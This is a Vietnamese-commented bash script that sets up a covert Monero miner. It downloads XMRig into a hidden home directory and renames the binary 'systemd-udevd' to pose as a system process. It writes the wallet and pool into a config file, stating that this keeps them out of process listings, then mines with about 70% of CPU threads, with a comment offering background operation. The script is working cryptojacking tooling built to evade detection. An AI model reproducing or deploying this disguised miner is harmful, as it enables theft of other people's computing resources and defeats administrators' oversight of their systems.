#!/bin/bash

# ==== Cấu hình ví và pool ====
MONERO_WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz" # THAY THẾ BẰNG VÍ CỦA BẠN
POOL_URL="pool.hashvault.pro:443" # THAY THẾ BẰNG ĐỊA CHỈ POOL CỦA BẠN
FAKE_NAME="systemd-udevd" # Tên giả cho tiến trình
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz" # Đảm bảo đây là phiên bản đúng
TARGET_CPU_PERCENT=70 # Mục tiêu sử dụng CPU (ví dụ: 70%)

# --- Thư mục làm việc ---
# Thay đổi thư mục làm việc để không cần sudo khi tạo/xoá file
# Sẽ tạo một thư mục .xmrig_miner trong thư mục HOME của người dùng
MINER_DIR="$HOME/.xmrig_miner"
mkdir -p "$MINER_DIR" # Tạo thư mục nếu chưa có
cd "$MINER_DIR" || { echo "[!] Không thể vào thư mục '$MINER_DIR'. Thoát."; exit 1; }

# ==== Ước tính số luồng CPU dựa trên CPU hiện có ====
# Lấy số luồng CPU vật lý
TOTAL_CPU_THREADS=$(nproc --all)
if [ -z "$TOTAL_CPU_THREADS" ]; then
    echo "[!] Không thể xác định số luồng CPU. Mặc định dùng 1 luồng."
    NUM_CPU_THREADS=1
else
    # Tính số luồng cần dùng để đạt TARGET_CPU_PERCENT
    # Lấy 70% của tổng số luồng, làm tròn xuống và đảm bảo ít nhất là 1 luồng
    NUM_CPU_THREADS=$(( TOTAL_CPU_THREADS * TARGET_CPU_PERCENT / 100 ))
    if [ "$NUM_CPU_THREADS" -eq 0 ]; then
        NUM_CPU_THREADS=1
    fi
    echo "[*] Tổng số luồng CPU khả dụng: $TOTAL_CPU_THREADS"
    echo "[*] Sẽ sử dụng $NUM_CPU_THREADS luồng để đạt ~${TARGET_CPU_PERCENT}% CPU."
fi

# ==== Dọn dẹp file cũ nếu có ====
echo "[*] Đang dọn dẹp các file miner cũ (nếu có) trong $MINER_DIR..."
rm -f xmrig* miner.tar.gz "$FAKE_NAME"

# ==== Tải XMRig về ====
echo "[*] Đang tải XMRig từ $XMRIG_URL vào $MINER_DIR..."
wget -q --show-progress -O miner.tar.gz "$XMRIG_URL"
if [ ! -s miner.tar.gz ]; then
    echo "[!] Không tải được XMRig. Kiểm tra lại URL hoặc kết nối mạng. Thoát."
    exit 1
fi
echo "[*] Tải XMRig hoàn tất."

# ==== Giải nén ====
echo "[*] Đang giải nén XMRig..."
tar -xf miner.tar.gz --strip-components=1 # --strip-components=1 để giải nén trực tiếp vào thư mục hiện tại
if [ ! -f xmrig ]; then # Kiểm tra xem file xmrig đã được giải nén chưa
    echo "[!] File 'xmrig' không được tìm thấy sau khi giải nén. Thoát."
    exit 1
fi
echo "[*] Giải nén thành công."

# ==== Đổi tên tiến trình & phân quyền ====
echo "[*] Đổi tên 'xmrig' thành '$FAKE_NAME' và cấp quyền thực thi..."
mv xmrig "$FAKE_NAME"
chmod +x "$FAKE_NAME"
echo "[*] Đã đổi tên và phân quyền."

# ==== Tạo cấu hình JSON (ẩn ví/pool khỏi ps aux) ====
echo "[*] Tạo file cấu hình config.json..."
cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$POOL_URL",
            "user": "$MONERO_WALLET",
            "pass": "x",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
echo "[*] Đã tạo config.json."

# ==== Bắt đầu đào với số luồng CPU đã tính toán ====
echo "---------------------------------------------------------"
echo "[*] BẮT ĐẦU ĐÀO MONERO (XMR) SỬ DỤNG $NUM_CPU_THREADS LUỒNG CPU."
echo "[*] Mục tiêu sử dụng CPU: ~${TARGET_CPU_PERCENT}%"
echo "[*] Kiểm tra kết nối pool và hash rate trong vài phút tới."
echo "---------------------------------------------------------"

# Chạy XMRig với số luồng đã tính toán
./"$FAKE_NAME" --no-color --threads="$NUM_CPU_THREADS"

# Lệnh này giữ terminal mở để bạn có thể xem nhật ký.
# Nếu bạn muốn script chạy nền, hãy xóa dòng này hoặc thêm '&' vào cuối dòng chạy miner.
# Ví dụ: ./"$FAKE_NAME" --no-color --threads="$NUM_CPU_THREADS" &
# read -p "Nhấn Enter để thoát script..."
